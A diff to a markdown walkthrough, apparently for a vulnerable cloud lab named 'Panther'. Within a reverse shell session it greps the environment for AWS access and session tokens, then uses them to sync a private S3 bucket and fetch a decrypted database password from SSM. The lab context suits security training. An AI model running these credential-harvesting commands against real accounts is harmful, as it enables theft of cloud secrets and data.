@@ -127,8 +127,7 @@ _=/usr/bin/env
 Within a Panther reverse shell session:
 
 ```bash
-env | grep ACCESS
-env | grep AWS_SESSION_TOKEN
+env | grep 'ACCESS\|SESSION'
 ```
 
 ### Accessing Private Resources
@@ -144,7 +143,7 @@ export AWS_SESSION_TOKEN=<ENTER SESSION TOKEN>
 Run the following commands:
 
 ```bash
-aws s3 cp s3://panther-$BUCKET_SUFFIX/assets/panther.jpg .
+aws s3 sync s3://panther-5fb50fef1d73 ~/panther
 aws ssm get-parameter --name /panther/database/password --with-decryption --region us-east-1
 ```
 
